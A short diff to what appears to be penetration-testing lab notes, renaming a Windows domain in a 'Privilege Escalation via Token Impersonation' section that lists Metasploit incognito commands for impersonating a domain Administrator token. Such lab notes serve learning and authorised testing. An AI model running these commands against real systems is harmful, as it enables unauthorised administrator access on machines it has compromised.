@@ -289,12 +289,12 @@ exploit
 
 
 ### Privilege Escalation via Token Impersonation
-Using `incognito` to impersonate `ATTACKDEFENSE\Administrator`:
+Using `incognito` to impersonate `blb\Administrator`:
 
 ```bash
 load incognito
 list_tokens -u
-impersonate_token ATTACKDEFENSE\\Administrator
+impersonate_token blb\\Administrator
 getuid
 ```
 
